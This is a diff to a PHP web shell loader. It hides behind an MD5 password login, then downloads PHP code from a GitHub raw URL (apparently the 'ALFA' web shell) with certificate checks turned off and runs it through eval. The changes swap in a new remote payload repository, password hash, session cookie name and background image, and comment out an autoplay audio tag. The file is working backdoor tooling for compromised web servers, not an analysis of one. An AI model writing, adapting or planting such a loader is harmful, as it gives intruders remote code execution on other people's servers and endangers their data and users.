@@ -16,8 +16,8 @@ function geturlsinfo($url) {
         curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
 
         // Set cookies using session if available
-        if (isset($_SESSION['SAP'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
+        if (isset($_SESSION['Z4PHY'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['Z4PHY']);
         }
 
         $url_get_contents_data = curl_exec($conn);
@@ -42,11 +42,11 @@ function is_logged_in()
 // Check if the password is submitted and correct
 if (isset($_POST['password'])) {
     $entered_password = $_POST['password'];
-    $hashed_password = '190b6d402db6ce02363b983178ae9bc3'; // Replace this with your MD5 hashed password
+    $hashed_password = '28a5323655d10745e75362a444e36d3b'; // Replace this with your MD5 hashed password
     if (md5($entered_password) === $hashed_password) {
         // Password is correct, store it in session
         $_SESSION['logged_in'] = true;
-        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
+        $_SESSION['Z4PHY'] = 'Z4PHY'; // Replace this with your cookie data
     } else {
         // Password is incorrect
         echo "Incorrect password. Please try again.";
@@ -55,7 +55,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/alfa/z4p-alfa.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-alfa/z4p-alfa.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
@@ -74,7 +74,7 @@ if (is_logged_in()) {
       display: flex;
       justify-content: center;
       align-items: center;
-      background: url('https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/me.gif') no-repeat center center fixed;
+      background: url('https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/background.gif') no-repeat center center fixed;
       background-size: cover;
       color: white;
       font-family: Arial, sans-serif;
@@ -118,10 +118,10 @@ if (is_logged_in()) {
       <form method="POST" action="">
       <label for="password"><center><h1>BISMILLAH~</h1></center></label>
       <input type="password" id="password" name="password">
-      <input type="submit" value="Login Ketua">
-      <audio controls autoplay hidden>
+      <input type="submit" value="logged_in">
+      <!-- <audio controls autoplay hidden>
       <source src="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/Joji-GOU.mp3" type="audio/mpeg">
-      </audio>
+      </audio> -->
       </form>
       </body>
       </html>
